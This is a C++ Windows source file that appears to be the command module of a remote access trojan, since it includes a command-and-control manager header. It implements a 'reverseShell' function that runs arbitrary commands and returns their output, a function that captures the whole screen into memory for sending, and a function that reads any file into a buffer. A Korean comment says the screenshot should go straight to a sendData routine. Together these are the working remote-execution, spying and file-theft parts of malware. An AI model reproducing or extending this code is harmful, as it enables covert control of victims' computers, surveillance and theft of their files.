#include <Windows.h>
#include <iostream>
#include <ole2.h>
#include <olectl.h>
#include "commandManager.h"
#include "cncManager.h"
#include "DDproto.h"

commandManager::commandManager() {
}

std::string commandManager::reverseShell(std::string cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL)
            result += buffer;
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}


/* 화면 스샷 구현용 WriteFile 삭제하고 Stream을 바로 sendData로 넘겨줘야할듯*/
LPVOID commandManager::getScreen() {
    {
        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hdcSource = GetDC(NULL);
        HDC hdcMemory = CreateCompatibleDC(hdcSource);

        int capX = GetDeviceCaps(hdcSource, HORZRES);
        int capY = GetDeviceCaps(hdcSource, VERTRES);

        HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, w, h);

        HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

        BitBlt(hdcMemory, 0, 0, w, h, hdcSource, 0, 0, SRCCOPY);

        hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

        DeleteDC(hdcSource);
        DeleteDC(hdcMemory);

        HPALETTE hpal = NULL;

        PICTDESC pd;

        pd.cbSizeofstruct = sizeof(PICTDESC);
        pd.picType = PICTYPE_BITMAP;
        pd.bmp.hbitmap = hBitmap;
        pd.bmp.hpal = hpal;

        LPPICTURE picture;
        HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
            reinterpret_cast<void**>(&picture));

        LPSTREAM stream;
        res = CreateStreamOnHGlobal(0, true, &stream);


        LONG bytes_streamed;
        res = picture->SaveAsFile(stream, true, &bytes_streamed);

        HGLOBAL mem = 0;
        GetHGlobalFromStream(stream, &mem);
        LPVOID data = GlobalLock(mem);

        this->screen_len = bytes_streamed;

        UCHAR* ptr = new UCHAR[this->screen_len];
        memset(ptr, 0, this->screen_len);
        memcpy(ptr, data, this->screen_len);


        GlobalUnlock(mem);

        stream->Release();
        picture->Release();

        return (LPVOID)ptr;
    }
}

LPVOID commandManager::getFile(std::string &path) {
    FILE* fp = NULL;
    UCHAR* ptr = NULL;
    this->file_len = 0;

    int a = fopen_s(&fp, path.c_str(), "rb+");
    if (fp) {
        fseek(fp, 0, SEEK_END);
        ULONG64 size = ftell(fp);
        rewind(fp);     

        ptr = new UCHAR[size];
        memset(ptr, 0, size);
        fread(ptr, size, 1, fp);

        fclose(fp);

        this->file_len = size;
    }
    
    return ptr;

}